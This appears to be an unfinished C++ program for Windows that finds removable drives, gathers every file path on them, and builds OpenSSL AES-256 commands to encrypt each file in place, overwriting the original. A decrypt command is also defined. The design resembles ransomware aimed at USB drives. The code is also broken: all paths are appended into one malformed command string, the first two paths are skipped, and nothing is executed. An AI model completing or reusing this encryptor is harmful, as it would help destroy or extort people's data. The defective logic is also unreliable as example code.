#include<Windows.h>
#include <iostream>
#include<filesystem>
#include<tchar.h>
#include<vector>
#include <atlstr.h>
#include<fstream>
#include<iterator>
#include<cstdio>

#include<openssl/sha.h>


namespace filesystem = std::filesystem;

//void get_files(std::vector<std::string>& paths, std::string root_path)
//{
//
//	for (const auto& file : filesystem::directory_iterator(root_path))
//	{
//		if (filesystem::is_directory(file))
//		{
//			get_files(paths, file.path().string());
//		}
//	}
//}

void get_files(std::vector<std::string>& paths, LPCTSTR root_path)
{
	CStringA stringA(root_path);
	const char* const_char_root_path = stringA;
	char* char_root_path = const_cast<char*>(const_char_root_path);
	for (const auto& file : filesystem::directory_iterator(const_char_root_path))
	{
		if (filesystem::is_directory(file))
		{
			get_files(paths, file.path().string().c_str());
		}
		else
		{
			paths.push_back(file.path().string());
		}
	}
}

int main()
{

	TCHAR sz_buffer[256];  
	LPCTSTR buffer_ptr = sz_buffer; 
	GetLogicalDriveStrings(255, sz_buffer);
	std::vector<std::string> paths;

	//system("C://ZeD_Crypto//test.txt -out C://ZeD_Crypto//test.txt -pass passwd.txt"); //-"openssl aes-256-cbc -a -salt -pbkdf2 -in C://ZeD_Crypto//test.txt -out C://ZeD_Crypto//testenc.txt"
	
	 std::string ENCRYPT_COMMAND = "openssl aes-256-cbc -a -salt -pbkdf2 -in ";
	 std::string DECRYPT_COMMAND = "openssl aes-256-cbc -d -a -salt -pbkdf2 -in ";


	for (buffer_ptr; *buffer_ptr != '\0'; buffer_ptr += _tcsclen(sz_buffer) + 1) 
	{
		if (GetDriveType(buffer_ptr) == DRIVE_REMOVABLE)
		{
			get_files(paths, buffer_ptr);
		}	
	}

	for (size_t i = 2; i < paths.size(); ++i)
	{
		ENCRYPT_COMMAND += paths[i] + "-out " + paths[i];
	}

	
}


